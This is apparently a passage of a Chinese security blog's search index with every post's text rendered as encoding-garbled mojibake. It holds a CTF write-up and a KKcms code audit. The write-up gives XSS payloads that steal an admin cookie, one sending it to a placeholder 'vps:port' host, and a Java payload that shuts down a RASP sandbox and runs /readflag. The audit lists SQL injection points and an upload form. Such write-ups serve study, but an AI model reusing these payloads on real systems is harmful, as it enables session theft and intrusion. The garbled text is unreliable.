·çš„æ­¥éª¤å†æ¥ä¸€æ¬¡è·å–adminçš„cookie\n\n~~~js\n<script>fetch('/store',{body:\"''p\"+`rivileged_cookie''=`+encodeURIComponent(document.cookie),method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script\n>\n~~~\n\næˆ–è€…å°±æ˜¯ç›´æ¥å¼¹å‡ºprivilegeå’Œadminçš„cookie\n\n~~~\n<img src=\"\" onerror=document.location='http://vps:port?cookie='+document.cookie />\n~~~\n\n# OnlineRunner\n\nè¿™é“é¢˜æ²¡æœ‰åŠæ³•ç”¨importçš„æ–¹å¼æ¥å¯¼å…¥ç±»ï¼Œèƒ½æ‰§è¡Œå‘½ä»¤çš„éƒ½ä¸èƒ½ç”¨ï¼Œåå°„ä¹Ÿæ²¡æœ‰åŠæ³•ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œçœ‹åˆ«çš„å¸ˆå‚…æ˜¯è¦ç»•è¿‡ä¸€ä¸ªæ²™ç®±\n\n[æ¢ç´¢Java RASP Bypassæ–°å§¿åŠ¿](https://vidar-team.feishu.cn/docx/AUvRdig4roPFOuxRvxAcpT81n9b)\n\nè¿™é‡Œæˆ‘è¿˜æ˜¯æœ‰ç‚¹æ‡µï¼Œç›´æ¥è´´åˆ«çš„å¸ˆå‚…çš„payload\n\n~~~java\nString[]Â filesÂ =Â {\"/proc/net/tcp\",Â \"/proc/net/tcp6\"};\nÂ Â Â Â Â Â Â Â forÂ (intÂ fÂ =Â 0;Â fÂ <Â files.length;Â f++)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â tryÂ {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â java.io.BufferedReaderÂ readerÂ =Â newÂ java.io.BufferedReader(newÂ java.io.FileReader(files[f]));\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringÂ line;\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â reader.readLine();Â //Â SkipÂ headerÂ line\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â whileÂ ((lineÂ =Â reader.readLine())Â !=Â null)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â lineÂ =Â line.trim();\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â String[]Â partsÂ =Â line.split(\"\\\\s+\");\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (parts.lengthÂ >Â 3)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringÂ local_addressÂ =Â parts[1];\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringÂ stateÂ =Â parts[3];\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â //Â StateÂ 0AÂ meansÂ LISTEN\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (state.equals(\"0A\"))Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â String[]Â addrPortÂ =Â local_address.split(\":\");\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringÂ ipHexÂ =Â addrPort[0];\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringÂ portHexÂ =Â addrPort[1];\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringÂ ipÂ =Â \"\";\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (files[f].endsWith(\"tcp6\"))Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â //Â IPv6Â addressÂ parsing\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringBuilderÂ ipBuilderÂ =Â newÂ StringBuilder();\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â forÂ (intÂ iÂ =Â ipHex.length();Â iÂ >Â 0;Â iÂ -=Â 8)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringÂ segmentÂ =Â ipHex.substring(Math.max(iÂ -Â 8,Â 0),Â i);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringBuilderÂ segBuilderÂ =Â newÂ StringBuilder();\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â forÂ (intÂ jÂ =Â segment.length();Â jÂ >Â 0;Â jÂ -=Â 2)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â segBuilder.append(segment.substring(jÂ -Â 2,Â j));\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ipBuilder.insert(0,Â segBuilder.toString());\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (iÂ >Â 8)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ipBuilder.insert(0,Â \":\");\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ipÂ =Â ipBuilder.toString();\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }Â elseÂ {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â //Â IPv4Â addressÂ parsing\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringBuilderÂ ipBuilderÂ =Â newÂ StringBuilder();\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â forÂ (intÂ iÂ =Â ipHex.length();Â iÂ >Â 0;Â iÂ -=Â 2)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringÂ partÂ =Â ipHex.substring(iÂ -Â 2,Â i);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â intÂ numÂ =Â Integer.parseInt(part,Â 16);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ipBuilder.insert(0,Â num);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (iÂ >Â 2)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ipBuilder.insert(0,Â \".\");\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ipÂ =Â ipBuilder.toString();\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â intÂ portÂ =Â Integer.parseInt(portHex,Â 16);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â System.out.println(\"ListeningÂ onÂ \"Â +Â ipÂ +Â \":\"Â +Â port);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â reader.close();\nÂ Â Â Â Â Â Â Â Â Â Â Â }Â catchÂ (java.io.IOExceptionÂ e)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â System.out.println(e);\nÂ Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â }\ntryÂ {\nÂ Â Â Â Â Â Â Â Â Â Â Â java.net.URLÂ urlÂ =Â newÂ java.net.URL(\"http://127.0.0.1:46461/sandbox/default/module/http/sandbox-control/shutdown\");\nÂ Â Â Â Â Â Â Â Â Â Â Â java.net.HttpURLConnectionÂ connectionÂ =Â (java.net.HttpURLConnection)Â url.openConnection();\nÂ Â Â Â Â Â Â Â Â Â Â Â connection.setRequestMethod(\"GET\");\nÂ Â Â Â Â Â Â Â Â Â Â Â java.io.BufferedReaderÂ readerÂ =Â newÂ java.io.BufferedReader(\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â newÂ java.io.InputStreamReader(connection.getInputStream())\nÂ Â Â Â Â Â Â Â Â Â Â Â );\nÂ Â Â Â Â Â Â Â Â Â Â Â StringÂ line;\nÂ Â Â Â Â Â Â Â Â Â Â Â StringBuilderÂ responseÂ =Â newÂ StringBuilder();\nÂ Â Â Â Â Â Â Â Â Â Â Â whileÂ ((lineÂ =Â reader.readLine())Â !=Â null)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â response.append(line).append(\"\\n\");\nÂ Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â reader.close();\nÂ Â Â Â Â Â Â Â Â Â Â Â connection.disconnect();\nÂ Â Â Â Â Â Â Â Â Â Â Â System.out.println(response.toString());Â System.out.println(connection.getResponseCode());\nÂ Â Â Â Â Â Â Â }Â catchÂ (java.io.IOExceptionÂ e)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â System.out.println(e);\nÂ Â Â Â Â Â Â Â }\nÂ tryÂ {\nÂ Â Â Â Â Â Â Â Â Â Â Â StringÂ commandÂ =Â \"/readflag\";Â //Â UseÂ \"dir\"Â onÂ Windows\nÂ Â Â Â Â Â Â Â Â Â Â Â java.lang.ProcessÂ processÂ =Â java.lang.Runtime.getRuntime().exec(command);\nÂ Â Â Â Â Â Â Â Â Â Â Â java.io.BufferedReaderÂ readerÂ =Â newÂ java.io.BufferedReader(\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â newÂ java.io.InputStreamReader(process.getInputStream())\nÂ Â Â Â Â Â Â Â Â Â Â Â );\nÂ Â Â Â Â Â Â Â Â Â Â Â StringÂ line;\nÂ Â Â Â Â Â Â Â Â Â Â Â whileÂ ((lineÂ =Â reader.readLine())Â !=Â null)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â System.out.println(line);\nÂ Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â reader.close();\nÂ Â Â Â Â Â Â Â Â Â Â Â process.waitFor();\nÂ Â Â Â Â Â Â Â }Â catchÂ (ExceptionÂ e)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â e.printStackTrace();\nÂ Â Â Â Â Â Â Â }\n\n/*try{\n\njava.io.FileÂ folderÂ =Â newÂ java.io.File(\"/home\");\nÂ Â Â Â Â Â Â Â ifÂ (!folder.isDirectory())Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â System.out.println(\"ProvidedÂ pathÂ isÂ notÂ aÂ folder\");\nÂ Â Â Â Â Â Â Â Â Â Â Â return;\nÂ Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â java.io.ByteArrayOutputStreamÂ baosÂ =Â newÂ java.io.ByteArrayOutputStream();\nÂ Â Â Â Â Â Â Â java.util.zip.ZipOutputStreamÂ zosÂ =Â newÂ java.util.zip.ZipOutputStream(baos);\nÂ Â Â Â Â Â Â Â java.util.Stack<java.io.File>Â stackÂ =Â newÂ java.util.Stack<java.io.File>();\nÂ Â Â Â Â Â Â Â stack.push(folder);\nÂ Â Â Â Â Â Â Â whileÂ (!stack.isEmpty())Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â java.io.FileÂ currentFileÂ =Â stack.pop();\nÂ Â Â Â Â Â Â Â Â Â Â Â ifÂ (currentFile.isDirectory())Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â java.io.File[]Â fileListÂ =Â currentFile.listFiles();\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (fileListÂ !=Â null)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â forÂ (intÂ iÂ =Â 0;Â iÂ <Â fileList.length;Â i++)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â stack.push(fileList[i]);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â }Â elseÂ {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â java.io.FileInputStreamÂ fisÂ =Â newÂ java.io.FileInputStream(currentFile);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â StringÂ zipEntryNameÂ =Â currentFile.getAbsolutePath().substring(folder.getAbsolutePath().length()Â +Â 1);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â zos.putNextEntry(newÂ java.util.zip.ZipEntry(zipEntryName));\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â byte[]Â bufferÂ =Â newÂ byte[1024];\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â intÂ length;\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â whileÂ ((lengthÂ =Â fis.read(buffer))Â >Â 0)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â zos.write(buffer,Â 0,Â length);\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â fis.close();\nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â zos.closeEntry();\nÂ Â Â Â Â Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â zos.close();\nÂ Â Â Â Â Â Â Â byte[]Â zipBytesÂ =Â baos.toByteArray();\nÂ Â Â Â Â Â Â Â StringBuilderÂ hexStringÂ =Â newÂ StringBuilder();\nÂ Â Â Â Â Â Â Â forÂ (intÂ iÂ =Â 0;Â iÂ <Â zipBytes.length;Â i++)Â {\nÂ Â Â Â Â Â Â Â Â Â Â Â StringÂ hexÂ =Â Integer.toHexString(0xffÂ &Â zipBytes[i]);\nÂ Â Â Â Â Â Â Â Â Â Â Â ifÂ (hex.length()Â ==Â 1)Â hexString.append('0');\nÂ Â Â Â Â Â Â Â Â Â Â Â hexString.append(hex);\nÂ Â Â Â Â Â Â Â }\nÂ Â Â Â Â Â Â Â System.out.println(hexString.toString());\n\n}catch(ExceptionÂ e){System.out.println(e);}*/\n~~~\n\n~~~\n#è¯»å–æ–‡ä»¶\n\ntry { Â  Â  Â  Â  Â  Â  Â  Â  Â \nÂ Â Â  java.io.File file = new java.io.File(\"/home/ctf/sandbox/lib/sandbox-agent.jar\"); // éœ€è¦è¯»å–çš„äºŒè¿›åˆ¶æ–‡ä»¶ Â  Â  \nÂ Â Â  java.io.BufferedInputStream bis = new java.io.BufferedInputStream(new java.io.FileInputStream(file)); Â  Â  Â  Â  Â  Â  Â  Â  Â \nÂ Â Â Â Â Â Â Â Â Â Â  byte[] buffer = new byte[1024]; // åˆ›å»ºä¸€ä¸ªå­—èŠ‚æ•°ç»„ä½œä¸ºç¼“å†²åŒº Â  Â  Â  Â  Â  Â  Â  Â  Â \nÂ Â Â Â Â Â Â Â Â Â Â  int bytesRead; Â  Â  Â  Â  Â  Â  Â  Â  Â Â  Â  Â \nÂ Â Â Â Â Â Â Â Â Â Â  while ((bytesRead = bis.read(buffer)) != -1) { // å¾ªç¯è¯»å– Â  Â  Â  Â  Â  Â  Â  Â  Â \nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â  // å¤„ç†è¯»å–çš„æ•°æ®ï¼ˆè¿™é‡Œå¯ä»¥è¿›è¡Œæ‰“å°ã€å¤„ç†ç­‰ï¼‰ Â  Â  Â  Â  Â  Â  Â  Â  Â \nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â  //System.out.write(buffer, 0, bytesRead); Â  Â  Â  Â  Â  Â  Â  Â  Â \nSystem.out.print('\"'); Â  Â  Â  Â  Â  Â  Â  Â  Â \nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â  System.out.print(java.util.Base64.getEncoder().encodeToString(buffer)); Â  Â  Â  Â  Â  Â  Â  Â  Â \nSystem.out.println(\"\\\",\"); Â  Â  Â  Â  Â  Â  Â  Â  Â \n\tÂ Â Â Â Â  } Â  Â  Â  Â  Â  Â  Â  Â  Â Â  Â  Â  Â  Â  Â  Â  Â  Â \nÂ Â Â Â Â Â Â  } catch ( Â  Â  Â  Â  Â  Â  Â  Â  Â \njava.io.IOException e) { Â  Â  Â  Â  Â  Â  Â  Â  Â \nÂ Â Â Â Â Â Â Â Â Â Â  e.printStackTrace(); Â  Â  Â  Â  Â  Â  Â  Â  Â \nÂ Â Â Â Â Â Â  }\n~~~\n\nå…¶å®æ¯”èµ›çš„æ—¶å€™æƒ³è¿‡ç”¨base64å°†æ–‡ä»¶ç¼–ç è¯»å–ï¼Œä½†æ˜¯å› ä¸ºæ•°æ®è¿‡å¤§å¯¼è‡´ç½‘é¡µå¡æ­»äº†å°±æ²¡æœ‰ç»§ç»­æƒ³è¿‡äº†\n\n---\n\nå”‰ï¼Œè¿˜å¾—ç»§ç»­å­¦ï¼Œå¤ªèœäº†\n","tags":["ctf"],"categories":["ctf","å¤ç›˜"]},{"title":"KKcmsä»£å®¡","url":"/2024/10/15/KKcmsä»£å®¡/","content":"\n\n\n# ç¯å¢ƒå®‰è£…\n\næºç ä¸‹è½½åœ°å€ï¼šhttps://github.com/erichuang2015/kkcms\n\nphp5.6 .9+mysql5.7.26+apache2.4.39\n\n# å®¡è®¡\n\n### éªŒè¯ç å¤ç”¨\t\n\n![](/pic/kkcms/verify1.png)\n\n~~~javascript\n<img src=\"../system/verifycode.php\" onclick=\"javascript:this.src='../system/verifycode.php?'+Math.random()\" style=\"cursor:pointer;\" alt=\"ç‚¹å‡»æ›´æ¢\" title=\"ç‚¹å‡»æ›´æ¢\" />\n~~~\n\nè¿™ä¸²ä»£ç ç”¨æ¥æ‰§è¡Œjsä»£ç æ›´æ¢éªŒè¯ç ï¼Œä½†æ˜¯bpå®ƒé»˜è®¤ä¸åŠ è½½jsï¼Œæ‰€ä»¥é€ æˆäº†éªŒè¯ç å¤ç”¨ã€‚\n\n~~~php\n<?php\nsession_start();\n$image = imagecreate(50, 34);\n$bcolor = imagecolorallocate($image, 0, 0, 0);\n$fcolor = imagecolorallocate($image, 255, 255, 255);\n$str = '0123456789';\n$rand_str = '';\nfor ($i = 0; $i < 4; $i++){\n\t$k = mt_rand(1, strlen($str));\n\t$rand_str .= $str[$k - 1];\n}\n$_SESSION['verifycode'] = $rand_str;\nimagefill($image, 0, 0, $bcolor);\nimagestring($image, 7, 7, 10, $rand_str, $fcolor);\nheader('content-type:image/png');\nimagepng($image);\n?>\n\n~~~\n\nverifycode.phpçš„ä»£ç ï¼Œå°±æ˜¯ç”Ÿæˆä¸€ä¸ªéšæœºçš„4ä½0-9çš„å›¾ç‰‡éªŒè¯ç \n\n### æ–‡ä»¶ä¸Šä¼ \n\nè¿™ä¸ªcmsé»˜è®¤ç”¨çš„ç¼–è¾‘å™¨æ˜¯KindEditor,ç‰ˆæœ¬æ˜¯4.1.10ï¼Œæ„é€ payload\n\n~~~\n<html><form enctype=\"multipart/form-data\" action=\"http://127.0.0.1/editor/php/upload_json.php\" method=\"post\"> Upload a new file:<br> <input type=\"file\" name=\"imgFile\" size=\"50\"><br> <input type=\"submit\" value=\"Upload\"> </form></html>\n~~~\n\nå¯ä»¥ç›´æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ã€‚\n\n![](/pic/kkcms/upload1.png)\n\nè€Œä¸”ä»–æœ‰ç™½åå•ï¼Œåªèƒ½ä¸Šä¼ æŒ‡å®šçš„åç¼€æ–‡ä»¶ã€‚\n\n### å‰å°sqlæ³¨å…¥\n\nåœ¨`template\\wapian\\vlist.php`è¿™é‡Œ\n\n![](/pic/kkcms/sql1.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–æ²¡æœ‰ä»»ä½•çš„é˜²æŠ¤ï¼Œä½†å…¶å®æ˜¯æœ‰é˜²æŠ¤çš„,vlist.phpé‡ŒåŒ…å«äº†system/inc.php,è€Œinc.phpä¸­æœ‰ä¸€ä¸ªè½¬ä¹‰çš„å‡½æ•°\n\n![](/pic/kkcms/sql2.png)\n\n\n\nä½†æ˜¯è¿™é‡Œä¸ºä»€ä¹ˆå¯ä»¥æ³¨å…¥å‘¢ï¼Ÿæ˜¯å› ä¸ºè¿™é‡Œæ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œæ²¡æœ‰ç”¨åŒå¼•å·åŒ…è£¹ï¼Œè‡ªç„¶ä¹Ÿä¸ç”¨åŒå¼•å·è¿›è¡Œé—­åˆï¼Œaddslashesä¹Ÿå°±æ²¡èµ·ä¸Šä½œç”¨,æ”¾è¿›sqlmapé‡Œå°±å¯ä»¥è·‘å‡ºæ¥ã€‚\n\n![](/pic/kkcms/sql3.png)\n\n### å‰å°sqlæ³¨å…¥2\n\nåœ¨ucenter\\reg.phpé‡Œ\n\n![](/pic/kkcms/sql4.png)\n\nè¿™é‡Œä¸ºä»€ä¹ˆå¯ä»¥æ³¨å…¥å‘¢ï¼Ÿè¿™é‡Œæ˜¯å› ä¸ºä»–æœ‰ä¸€ä¸ªstripslasheså‡½æ•°ï¼Œå®ƒä¼šåˆ é™¤ç”±addslashesæ·»åŠ ä¸Šçš„æ–œæ ï¼Œæ”¾è¿›sqlmapé‡Œè·‘\n\n![](/pic/kkcms/sql5.png)\n\nä¹Ÿæ˜¯å¯ä»¥è·‘å‡ºæ¥ç›²æ³¨ã€‚æœç´¢stripslasheså…³é”®å­—ï¼Œå¯ä»¥æ‰¾åˆ°repass.phpå’Œactive.phpåŒæ ·æœ‰æ³¨å…¥ã€‚\n\n### åå°sqlæ³¨å…¥\n\nåœ¨cms_usergroup_edit.phpå¤„\n\n![](/pic/kkcms/sql6.png)\n\nä¿®æ”¹ä¼šå‘˜çº§åˆ«å¤„æœ‰ç›²æ³¨ï¼Œä½†æ˜¯sqlè·‘ä¸å‡ºæ¥ä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ç„¶åå’Œæ­¤å¤„ä¸€æ ·çš„è¿˜æœ‰cms_ad_edit.phpã€cms_admin_edit.phpã€cms_book_edit.phpã€cms_channel_edit.php\n\nè¿˜æœ‰ä¸€å¤„\n\n![](/pic/kkcms/sql7.png)\n\nè¿™é‡Œæœ‰deleteæ³¨å…¥ï¼Œæ•´ä¸ªåå°çš„deleteè¯­å¥å…¨æ˜¯è¿™æ ·å†™çš„ã€‚\n\n---\n\nXSSæ¼æ´å°±ä¸å®¡è®¡äº†ï¼Œè¿™ä¸ªcmså°±è¿™æ ·å§ï¼Œä¸€ä¸ªæ¯”è¾ƒç®€å•çš„cmsã€‚\n","tags":["web","ä»£ç å®¡è®¡"],"categories":["ä»£ç å®¡è®¡"]},{"title":"javaåå°„","url":"/2024/05/31/javaåå°„/","content":"\n\n\n## ä»€ä¹ˆæ˜¯åå°„\n\nåå°„æ˜¯å¤§å¤šæ•°è¯­è¨€éƒ½å¿…ä¸å¯å°‘çš„ç»„æˆéƒ¨åˆ†ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åå°„è·å–ä»–çš„ç±»ï¼Œç±»å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰â½…æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰ï¼‰ï¼Œæ‹¿åˆ°çš„â½…æ³•å¯ä»¥è°ƒâ½¤ï¼Œæ€»ä¹‹é€šè¿‡â€œåå°„â€ï¼Œæˆ‘ä»¬å¯ä»¥å°† Java è¿™ç§é™æ€è¯­â¾”é™„åŠ ä¸ŠåŠ¨æ€ç‰¹æ€§ã€‚\n\n## Javaåå°„ç»„æˆç›¸å…³çš„ç±»\n\njava.lang.Classï¼šç±»å¯¹è±¡;\n\njava.lang.reflect.Constructorï¼šç±»çš„æ„é€ å™¨å¯¹è±¡;\n\njava.lang.reflect.Fieldï¼šç±»çš„å±æ€§å¯¹è±¡;\n\njava.lang.reflect.Methodï¼šç±»çš„æ–¹æ³•å¯¹è±¡;\n\n## å®ä¾‹åŒ–å¯¹è±¡çš„æ–¹æ³•\n\n#### å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•\n\nå¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ `obj`ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ `obj.getClass` æ¥è·å–å®ƒçš„ç±»ã€‚\n\n#### ä½¿ç”¨ç±»çš„ .class æ–¹æ³•\n\nå¦‚æœä½ å·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„ `java.lang.Class` å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ‹¿å®ƒçš„ `class` å±æ€§å³å¯ã€‚è¿™ä¸ªâ½…æ³•å…¶å®ä¸å±äºåå°„ã€‚\n\n#### Class.forName(String className)ï¼šåŠ¨æ€åŠ è½½ç±»\n\nå¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿â½¤ `forName` æ¥è·å–ï¼Œåç»­è¦åˆ©ç”¨çš„è¯æ˜¯éœ€è¦å®ä¾‹åŒ–çš„ã€‚\n\n## è·å–æˆå‘˜å˜é‡Field\n\nè·å–æˆå‘˜å˜é‡Fieldä½äº `java.lang.reflect.Field` åŒ…ä¸­\n\nField[] getFields() ï¼šè·å–æ‰€æœ‰ public ä¿®é¥°çš„æˆå‘˜å˜é‡\n\nField[] getDeclaredFields() è·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦\n\nField getField(String name) è·å–æŒ‡å®šåç§°çš„ public ä¿®é¥°çš„æˆå‘˜å˜é‡\n\nField getDeclaredField(String name) è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡\n\n##  è·å–æˆå‘˜æ–¹æ³• Method\n\n~~~java\nMethod getMethod(String name, ç±»<?>... parameterTypes) //è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„publicæ–¹æ³•\n\nMethod getDeclaredMethod(String name, ç±»<?>... parameterTypes) //è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„æ‰€æœ‰æ–¹æ³•\n\n//ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¯¥æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°è·å–æ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹\n\nMethod[] getMethods() //è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•\n\nMethod[] getDeclaredMethods() // è·å–è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•\n~~~\n\n## è·å–æ„é€ å‡½æ•° Constructor\n\n~~~JAVA\nConstructor<?>[] getConstructors() 